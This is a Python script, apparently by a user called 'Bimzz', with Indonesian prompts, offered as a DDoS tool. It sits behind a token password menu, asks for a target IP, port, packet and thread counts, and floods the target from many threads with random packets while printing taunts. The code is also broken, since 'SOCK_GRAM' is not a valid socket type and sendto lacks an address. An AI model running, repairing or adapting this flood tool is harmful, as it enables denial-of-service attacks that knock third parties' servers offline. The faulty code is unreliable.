#python 3.7.1
#code by bimzz

import socket
import random
import threading
import os
import time
import sys

#tampilan
password ="BimzzDDOS"
print("""\u001b[31m
[Bimzz] ==> LoginMenu!!""")
for i in range(3):
	pwd = input("[•] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] TUNGGU 5 DETIK!!! ")
		break
	else:
		time.sleep(5)
		print("[×] PASSWORD SALAH!!! ")
		continue
time.sleep(5)
print("[√] Berhasil Login, Wait")
time.sleep(5)
print("------------------------------------------------")
print("[+] Tools DDoS BETA VERSION By Bimzz")
print("[+] Discord : Bimzz#9999")
print("[+] YouTube : Bimzz")
print("[+] Author  : Bimzz x KyTeam")
print("[+] KyTeam  : https://discord.gg/YMT9utYW5U")
print("------------------------------------------------")

ip_bimzz = str(input("[Bimzz] IP TARGET : "))
port_bimzz = int(input("[Bimzz] PORT TARGET : "))
paket_bimzz = int(input("[Bimzz] PACKETS : "))
threads_bimzz = int(input("[Bimzz] THREADS (9024): "))
os.system("clear")
print("[Bimzz] => [Wait 3s]")
time.sleep(3)
def bimzz():
    bimzz_data = random._urandom(9024)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip_bimzz,port_bimzz))
            s.sendto(bimzz_data)
            for x in range(paket_bimzz):
                s.sendto(bimzz_data)
            print("[Bimzz] BIMZZ ATTACKING SERVERS!!!")
        except:
            print("[Bimzz] Yah Down Yah? Awokwsaowkswosk!!!")
            
for y in range(threads_bimzz):
    th = threading.Thread(target=bimzz)
    th.start()
